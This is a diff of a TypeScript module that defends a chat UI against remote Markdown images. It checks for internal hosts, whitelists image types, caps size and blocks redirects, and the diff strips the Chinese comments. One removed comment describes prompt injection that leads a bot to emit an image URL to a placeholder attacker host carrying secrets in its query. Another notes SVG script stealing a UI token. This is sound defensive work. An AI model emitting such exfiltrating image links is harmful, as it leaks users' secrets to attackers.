@@ -1,37 +1,26 @@
 import { t } from './i18n'
 
-/**
- * 對話 Markdown 裡的遠端圖片（issue #764）。bot 會讀外部內容，被 prompt injection 後輸出 `![](https://攻擊者/c?d=機密)`，
- * 瀏覽器一渲染就替它送出去——所以 http(s) 圖片預設不載入，先畫佔位，使用者點了才抓。
- */
-
 export function isRemoteHttpImage(src: string): boolean {
   return /^https?:/i.test(src.trim())
 }
 
-/** 參數長到這個長度就警告：正常的圖片網址很少帶這麼長的 query／fragment，夾資料的才會。 */
 const SUSPICIOUS_TAIL = 64
 
 export interface RemoteImageInfo {
   host: string
-  /** 網址帶帳密、或 query／fragment 很長——可能夾帶資料。 */
   suspicious: boolean
-  /** 本機（localhost、127/8、::1）、內網（10/8、172.16/12、192.168/16、fc00::/7）、link-local（169.254/16、fe80::/10）或 `.local`：點下去是由這台機器對它發請求。 */
   internal: boolean
 }
 
-/** IPv4 的前兩段就夠判：0/8、10/8、127/8、169.254/16、172.16/12、192.168/16。 */
 function isInternalV4(a: number, b: number): boolean {
   return a === 0 || a === 10 || a === 127 || (a === 169 && b === 254) || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168)
 }
 
-/** `URL.hostname` 給的主機名（IPv6 帶方括號）是不是本機／內網位址。 */
 function isInternalHost(hostname: string): boolean {
   const h = hostname.toLowerCase()
   if (h === 'localhost' || h.endsWith('.localhost') || h.endsWith('.local')) return true
   if (h.startsWith('[')) {
     const v6 = h.slice(1, -1)
-    // IPv4-mapped（`::ffff:127.0.0.1`）：URL 會正規化成 `::ffff:7f00:1`，兩段十六進位還原成 IPv4 再判。
     const mapped = /^::ffff:([0-9a-f]{1,4}):([0-9a-f]{1,4})$/.exec(v6)
     if (mapped) {
       const hi = parseInt(mapped[1], 16)
@@ -58,21 +47,14 @@ export function remoteImageInfo(src: string): RemoteImageInfo | null {
   }
 }
 
-/** 載入單張遠端圖片的上限，免得一張惡意大檔吃光記憶體。 */
 export const REMOTE_IMAGE_MAX_BYTES = 10 * 1024 * 1024
 
-/**
- * 只收這幾種點陣圖。**不收 SVG**：blob URL 繼承 app 的 origin，使用者點圖（`<a href=blob target=_blank>`）在新分頁開 blob 時，
- * SVG 裡的 `<script>` 就在 app 的 origin 執行，能拿到 daemon 的 UI token 操作所有 bot（#764 審查，真瀏覽器實測）。
- * 回傳白名單裡的標準型別；不在名單內回 null。
- */
 const SAFE_IMAGE_TYPES = ['image/png', 'image/jpeg', 'image/gif', 'image/webp', 'image/avif', 'image/bmp']
 export function safeImageType(contentType: string): string | null {
   const t = contentType.split(';')[0].trim().toLowerCase()
   return SAFE_IMAGE_TYPES.includes(t) ? t : null
 }
 
-/** 邊讀邊數，超過上限就停（不等整個回應進記憶體才檢查大小）。 */
 async function readCapped(res: Response, type: string): Promise<Blob> {
   const declared = Number(res.headers.get('content-length'))
   if (Number.isFinite(declared) && declared > REMOTE_IMAGE_MAX_BYTES) throw new Error(t('圖片太大'))
@@ -97,13 +79,6 @@ async function readCapped(res: Response, type: string): Promise<Blob> {
   return new Blob(chunks as BlobPart[], { type })
 }
 
-/**
- * 使用者點了「載入圖片」才呼叫。瀏覽器自己 `fetch`→blob：不帶 cookie、不帶 Referer（網址裡可能有 token），
- * 回應要是白名單裡的點陣圖（見 [[safeImageType]]，blob 一律用白名單型別重包）且不超過上限；
- * 對方沒開 CORS 或抓不到就丟錯，由畫面改成「在新分頁開啟」的連結。
- * `redirect: 'error'`：不跟轉址。佔位只寫了原網址的網域，跟著轉到別的主機＝請求送去使用者沒看到的地方；
- * CORS 模式下 `manual` 又讀不到 Location，事後比對最終網域也來不及（請求已送出），所以被轉址的圖一律算失敗、走新分頁連結。
- */
 export async function fetchRemoteImageBlob(src: string, fetchImpl: typeof fetch = fetch): Promise<Blob> {
   const res = await fetchImpl(src, { mode: 'cors', credentials: 'omit', referrerPolicy: 'no-referrer', redirect: 'error' })
   if (!res.ok) throw new Error(`HTTP ${res.status}`)
